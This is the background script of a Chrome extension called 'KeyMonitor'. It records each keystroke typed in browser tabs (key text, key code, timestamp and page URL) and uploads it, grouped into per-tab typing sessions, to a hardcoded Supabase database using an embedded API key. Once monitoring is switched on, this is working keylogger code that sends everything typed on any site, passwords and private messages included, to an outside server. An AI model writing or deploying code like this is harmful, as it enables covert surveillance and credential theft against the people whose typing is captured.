// Background service worker - handles saving keystrokes to Supabase
const SUPABASE_URL = 'https://hqsupcgziezjoahtnkae.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imhxc3VwY2d6aWV6am9haHRua2FlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODM0MjMwNDMsImV4cCI6MjA5ODk5OTA0M30.1SnDMJ0QHpix8GjzqalFrrqQIoC8PWHRHS1IgDaZbhg';

const REST = (path) => `${SUPABASE_URL}/rest/v1/${path}`;
const HEADERS = {
  'Content-Type': 'application/json',
  'apikey': SUPABASE_ANON_KEY,
  'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
  'Prefer': 'return=representation'
};

// Active sessions per tab: tabId -> sessionId
const activeSessions = {};

// Initialize device ID on install
chrome.runtime.onInstalled.addListener(function () {
  chrome.storage.local.get(['device_id', 'monitoring_enabled'], function (result) {
    if (!result.device_id) {
      const deviceId = 'ext_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
      chrome.storage.local.set({ device_id: deviceId, monitoring_enabled: false });
      console.log('[KeyMonitor] Device registered:', deviceId);
    }
  });
});

// Listen for messages from content scripts
chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
  if (message.type === 'KEYSTROKE') {
    saveKeystroke(message.data, sender.tab);
    sendResponse({ ok: true });
  } else if (message.type === 'SESSION_END') {
    endSession(message.data.tabId, message.data.keyCount);
    sendResponse({ ok: true });
  }
  return true; // keep channel open for async
});

// Start a new typing session for a tab
async function getOrCreateSession(tabId, deviceId) {
  if (activeSessions[tabId]) {
    return activeSessions[tabId];
  }

  try {
    const res = await fetch(REST('typing_sessions'), {
      method: 'POST',
      headers: HEADERS,
      body: JSON.stringify({
        device_id: deviceId,
        session_start: new Date().toISOString()
      })
    });

    if (res.ok) {
      const data = await res.json();
      const sessionId = Array.isArray(data) ? data[0]?.id : data?.id;
      if (sessionId) {
        activeSessions[tabId] = sessionId;
        console.log('[KeyMonitor] Session created:', sessionId, 'for tab:', tabId);
        return sessionId;
      }
    } else {
      console.error('[KeyMonitor] Session creation failed:', res.status, await res.text());
    }
  } catch (err) {
    console.error('[KeyMonitor] Session error:', err);
  }

  return null;
}

// Save a keystroke to Supabase
async function saveKeystroke(data, tab) {
  try {
    chrome.storage.local.get(['device_id', 'monitoring_enabled'], async function (result) {
      if (!result.monitoring_enabled) return;

      const deviceId = result.device_id;
      if (!deviceId) return;

      const tabId = tab ? tab.id : 0;
      const sessionId = await getOrCreateSession(tabId, deviceId);

      const res = await fetch(REST('keystroke_logs'), {
        method: 'POST',
        headers: { ...HEADERS, 'Prefer': 'return=minimal' },
        body: JSON.stringify({
          session_id: deviceId,
          device_id: deviceId,
          key_text: data.key_text,
          key_code: data.key_code,
          timestamp: data.timestamp,
          page_url: data.page_url,
          typing_session_id: sessionId
        })
      });

      if (!res.ok) {
        console.error('[KeyMonitor] Save failed:', res.status);
      }
    });
  } catch (err) {
    console.error('[KeyMonitor] Save error:', err);
  }
}

// End a typing session
async function endSession(tabId, keyCount) {
  const sessionId = activeSessions[tabId];
  if (!sessionId) return;

  try {
    await fetch(`${REST('typing_sessions')}?id=eq.${sessionId}`, {
      method: 'PATCH',
      headers: HEADERS,
      body: JSON.stringify({
        session_end: new Date().toISOString(),
        key_count: keyCount || 0
      })
    });
    console.log('[KeyMonitor] Session ended:', sessionId);
  } catch (err) {
    console.error('[KeyMonitor] End session error:', err);
  }

  delete activeSessions[tabId];
}

// Clean up sessions when a tab is closed
chrome.tabs.onRemoved.addListener(function (tabId) {
  if (activeSessions[tabId]) {
    endSession(tabId, 0);
  }
});
